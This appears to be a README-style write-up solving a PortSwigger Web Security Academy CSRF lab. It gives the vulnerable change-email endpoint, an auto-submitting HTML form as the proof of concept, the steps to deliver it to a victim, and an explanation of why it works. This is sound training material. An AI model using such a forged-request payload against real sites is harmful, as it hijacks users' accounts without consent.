# Manual Solution Using Burp Suite Community

## Lab

**CSRF vulnerability with no defenses**

> **Note:** Replace the lab URL below with your own PortSwigger Web Security Academy lab instance.

> **Lab Credentials:** `wiener:peter`

### Target Endpoint

```text
POST /my-account/change-email
```

### Request

```http
POST /my-account/change-email HTTP/2

email=anything@web-security-academy.net
```

### CSRF Proof of Concept

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
</form>

<script>
    document.forms[0].submit();
</script>
```

### Result

1. Log in to the application using the following credentials:

```text
Username: wiener
Password: peter
```

2. Change your email address and intercept the request using Burp Suite.
3. Identify the vulnerable endpoint:

```text
POST /my-account/change-email
```

4. Observe that the request does not contain any CSRF token or other anti-CSRF protection.
5. Create an HTML page that automatically submits a POST request to the vulnerable endpoint.
6. Upload the HTML to the exploit server.
7. View the exploit to verify that your own email address changes.
8. Modify the email address if necessary so that it differs from your own email address.
9. Deliver the exploit to the victim.

The victim's browser automatically submits the forged request while authenticated, changing the account's email address and solving the lab.

---

## Why It Works

The application accepts state-changing POST requests without verifying the origin of the request.

Because no CSRF token or equivalent anti-CSRF protection is present, an attacker can create a malicious webpage that automatically submits a forged request. If a logged-in victim visits this page, their browser includes the session cookies automatically, causing the email address to be changed without the victim's consent.

---

## Python Implementation

The accompanying Python script:

- Generates the CSRF proof-of-concept HTML.
- Uploads the exploit to the PortSwigger exploit server.
- Delivers the exploit to the victim.

```text
csrf-no-defenses.py
```
